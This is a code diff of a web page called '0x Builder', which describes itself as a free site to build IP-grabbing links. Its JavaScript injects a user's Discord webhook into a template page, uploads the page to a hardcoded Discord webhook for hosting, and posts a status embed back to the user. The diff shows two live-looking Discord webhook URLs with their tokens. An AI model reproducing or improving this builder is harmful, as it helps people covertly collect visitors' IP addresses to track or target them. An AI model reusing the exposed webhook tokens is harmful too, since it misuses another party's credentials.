@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Input Form Page</title>
+    <title>Builder</title>
     <!-- Open Graph Metadata -->
     <meta property="og:title" content="0x Builder">
     <meta property="og:description" content="0x Builder is a free website to build your IP grabbing links. By .gekkefries1">
     <meta property="og:image" content="https://i.ibb.co/W2DQr84/james-in-amry.png">
-    <meta property="og:url" content="https://gekkefries1.github.io/0x/">
+    <meta property="og:url" content="https://gekkefries.github.io/0x/">
     <meta property="og:type" content="website">
     <meta name="theme-color" content="#D42CE3">
 
@@ -93,14 +93,20 @@
         async function createAndSendFile() {
             const websiteName = document.getElementById('websiteName').value;
             const webhook = document.getElementById('webhook').value;
-            const discordWebhookUrl = 'https://discord.com/api/webhooks/1249796448187453443/yVCwBqCuj8j_YBq1MNNpB0orhINA5411WS3f-PQ4y4PrCnFBZfX9LDumINxo_0x7MHB3';
+            const discordWebhookUrl = 'https://discord.com/api/webhooks/1249792800833147021/Jrbb3WxzKVc88MWrsVlcjrlOVLYeFvVSTZc3-ECg-t7TnCyCHGpihom9uRes0oj6ZVfD';
 
             if (!websiteName || !webhook) {
                 alert('Please enter both Website Name and Webhook.');
                 return;
             }
 
-            // Fetch the content of the original HTML file
+            // Validate website name
+            const websiteNameRegex = /^[a-zA-Z]{1,10}$/; // Only normal letters, maximum 10 characters
+            if (!websiteNameRegex.test(websiteName)) {
+                alert('Website Name can only contain normal letters and must be between 1 to 10 characters.');
+                return;
+            }
+
             const response = await fetch('original.html');
             if (!response.ok) {
                 alert('Failed to load original.html');
@@ -108,10 +114,8 @@
             }
             let originalContent = await response.text();
 
-            // Replace the placeholder with the actual webhook
             const modifiedContent = originalContent.replace(/WEBHOOK_HERE/g, webhook);
 
-            // Create a Blob from the modified content
             const blob = new Blob([modifiedContent], { type: 'text/html' });
             const formData = new FormData();
             formData.append('file', blob, `${websiteName}.html`);
@@ -123,13 +127,35 @@
                 });
 
                 if (result.ok) {
-                    alert(`Website ${websiteName} sent successfully!`);
+                    // Send separate embed message to Discord
+                    const embedMessage = {
+                        content: ' ',
+                        embeds: [
+                            {
+                                title: 'Website Creation Notification',
+                                description: `Hello, I'm just here to notify you that we successfully sent it and is hopefully in a few minutes up and running.`,
+                                color: 0x00ff00, // Green color for success
+                                footer: {
+                                    text: 'https://gekkefries.github.io/0x/websites/' + encodeURIComponent(websiteName)
+                                }
+                            }
+                        ]
+                    };
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(embedMessage)
+                    });
+
+                    alert(`Website ${websiteName} sent successfully. Please check your Discord Webhook for more information.`);
                 } else {
-                    alert('Failed to send the website content to the Discord webhook.');
+                    alert('Failed to send the website content to the Discord Bot for Process.');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('An error occurred while sending the website content.');
+                alert('An error occurred while sending the File for process.');
             }
         }
 
@@ -148,3 +174,4 @@
     </script>
 </body>
 </html>
+
